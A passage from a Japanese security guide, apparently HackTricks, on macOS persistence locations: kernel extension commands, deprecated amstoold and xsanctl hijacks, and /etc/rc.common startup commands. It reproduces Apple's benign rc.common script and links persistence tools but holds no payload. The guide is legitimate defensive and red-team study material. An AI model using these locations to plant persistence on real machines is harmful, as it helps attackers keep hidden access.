- `/Library/Extensions`
- サードパーティソフトウェアによってインストールされたKEXTファイル

現在読み込まれているkextファイルをリストするには、次のコマンドを使用できます：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
より詳しい情報は[**カーネル拡張についてはこのセクションを確認してください**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers)を参照してください。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### 場所

- **`/usr/local/bin/amstoold`**
- ルート権限が必要

#### 説明と悪用

どうやら`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`は、このバイナリを使用してXPCサービスを公開していたようです... しかし、そのバイナリは存在しなかったため、そこに何かを置くことができ、XPCサービスが呼び出されるとあなたのバイナリが呼び出されます。

私のmacOSではこれを見つけることができません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### 場所

- **`/Library/Preferences/Xsan/.xsanrc`**
- ルート権限が必要
- **トリガー**: サービスが実行されるとき（稀に）

#### 説明と悪用

どうやらこのスクリプトを実行することはあまり一般的ではなく、私のmacOSでも見つけることができなかったので、詳細が必要な場合はwriteupを確認してください。

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最新のMacOSバージョンでは機能しません**

ここに**起動時に実行されるコマンドを配置することも可能です。** 例として通常のrc.commonスクリプト:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 永続性技術とツール

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
